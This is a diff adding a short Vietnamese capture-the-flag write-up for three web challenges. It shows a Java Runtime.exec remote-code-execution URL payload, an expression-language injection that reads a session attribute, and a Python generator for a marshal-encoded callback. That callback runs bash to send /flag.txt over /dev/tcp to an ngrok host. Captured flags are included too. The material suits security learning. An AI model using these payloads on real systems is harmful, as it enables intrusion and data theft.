@@ -1,0 +1,44 @@
+insecure:
+payload cơ bản của java thôi: Runtime.getRuntime().exec("cat webapps/ROOT/WEB-INF/flag.txt").getInputStream()
+payload: http://insecurityisfun.secathon2025-env.net/hello?username=eval:Runtime.getRuntime().exec(%22webapps%2FROOT%2FWEB-INF%2Fflag%2Etxt%22).getInputStream()
+FLAG: FUSec2025{@HopeYou@readyHaveFUn@}
+
+simple:
+Bước 1: Đăng nhập vô admin, xong ta sẽ thấy chỗ gen flag trong session, với mình là vpalnfpe
+Sau đó, đăng nhập vào nick thường, và sử dụng payload sau để đọc session trong hệ thống
+payload: ${pageContext.session.getAttribute('vpalnfpe')}
+FLAG: @ILoveIA_FPTU@
+
+atomic:
+Đọc src ta thấy main.js, sau khi đọc qua thì vấn đề là phải xác định dc cái default là loại mã hóa gì và được mã hóa ntn, do ta thấy dc nội dung payload nên dĩ nhiên r, chatgpt moment
+https://chatgpt.com/share/6885d2c2-858c-8007-b260-689833c6542a, từ chatgpt ta ra được đây là marshal, và khi ta thử edit username thì đúng thế thật, nó work
+Tiếp theo là đọc source, ta sẽ thấy callback có thể nằm ở trong session, tuy nhiên thử thì nó lại dính 500 rất nhiều.
+Sau 1 hồi guessing thì mình đã tìm được __import__('os').system('sleep 5') là hoạt động
+Vậy thì chỉ cần revshell và ta đã có flag
+```
+import base64
+import marshal
+
+def atomic_encode(data_bytes: bytes, key: str) -> str:
+    result = bytearray()
+    for i, b in enumerate(data_bytes):
+        result.append(b ^ ord(key[i % len(key)]))
+    return base64.b64encode(result).decode()
+
+def create_payload(payload_obj: dict, key: str) -> str:
+    # 1. Serialize object bằng marshal
+    marshalled = marshal.dumps(payload_obj)
+    
+    # 2. Encode theo atomicEncode
+    encoded = atomic_encode(marshalled, key)
+    return encoded
+
+
+# ===== Example usage =====
+secret_key = "sup3r_s3cr3t_k3y_f0r_pr0t0c0l"
+payload = {"user": "admin", "perms": ["{{7*7}}"], "callback":"__import__('os').system(' bash -c \"cat /flag.txt >& /dev/tcp/0.tcp.ap.ngrok.io/10718\" 0>&1')"}
+
+encoded_payload = create_payload(payload, secret_key)
+print(encoded_payload)
+```
+flag: FUSec2025{@mNhienT1EuH0nC#uoNg}
